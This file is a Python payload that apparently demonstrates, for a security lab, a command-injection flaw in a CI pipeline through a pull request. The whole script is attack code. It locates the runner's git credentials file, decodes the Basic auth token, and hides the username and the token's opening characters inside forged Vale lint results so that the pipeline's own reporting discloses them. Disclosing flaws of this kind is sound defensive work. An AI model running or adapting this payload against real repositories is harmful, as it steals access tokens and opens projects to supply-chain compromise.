# Replacement generator, carried by the pull request as data.
# Reports what the injected command can reach from the runner, credential redacted.
import json, io, glob, re, base64

NL = chr(10)
found = sorted(glob.glob("/home/runner/work/_temp/git-credentials-*.config"))
if not found:
    detail = "no credential file found"
else:
    raw = io.open(found[0], encoding="utf-8", errors="replace").read()
    m = re.search(r"[Bb]asic ([A-Za-z0-9+/=]+)", raw)
    if not m:
        detail = "credential file present, %d bytes, no basic header" % len(raw)
    else:
        dec = base64.b64decode(m.group(1)).decode("utf-8", "replace")
        user, _, tok = dec.partition(":")
        detail = ("credential store readable, %d bytes, value %d base64 chars, "
                  "decodes to %s:%s... rest redacted by the lab"
                  % (len(raw), len(m.group(1)), user, tok[:4]))

msg = "Consider revising." + NL + NL + "## " + detail

doc = {"summary": {"errors": 1, "warnings": 0, "suggestions": 0},
       "issues": [{"path": "packages/ordinary/docs/README.md", "line": 1,
                   "rule": "Elastic.Wordiness", "severity": "error",
                   "message": msg[:500]}]}
io.open("vale_results.json", "w", encoding="utf-8").write(json.dumps(doc))
io.open("issue_counts.txt", "w", encoding="utf-8").write(
    "errors=1" + NL + "warnings=0" + NL + "suggestions=0" + NL)
print("generator ran")
